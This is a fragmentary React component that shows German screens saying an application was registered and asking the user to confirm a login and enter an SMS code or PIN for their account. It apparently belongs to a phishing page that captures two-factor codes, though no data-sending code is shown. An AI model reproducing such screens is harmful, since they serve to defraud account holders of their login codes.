...
export const LOADER = ({
      ...
      <Cont>
        <div>
          <Title className="LR_TITLE">
            Ihre Bewerbung wurde erfolgreich registriert. Erwarten Sie eine Bestätigung per E-Mail.
          </Title>
        </div>
      </Cont>
    );
  ...
  const getType = () => {
    return type === '2FA' ? (
      <Cont>
        <div>
          <Title className="LR_TITLE">Bestätigen Sie die Anmeldung bei Ihrem Konto</Title>
        </div>
      ...
      <Cont>
        <div>
          <Title className="LR_TITLE">
            Geben Sie den SMS-Code ein, um Ihr persönliches Konto zu betreten
          </Title>
        </div>
        <div>
      ...
      <Cont>
        <div>
          <Title className="LR_TITLE">
            Geben Sie den PIN-Code ein, um Ihr persönliches Konto zu betreten
          </Title>
        </div>
        <div>
          <InputsContainer>
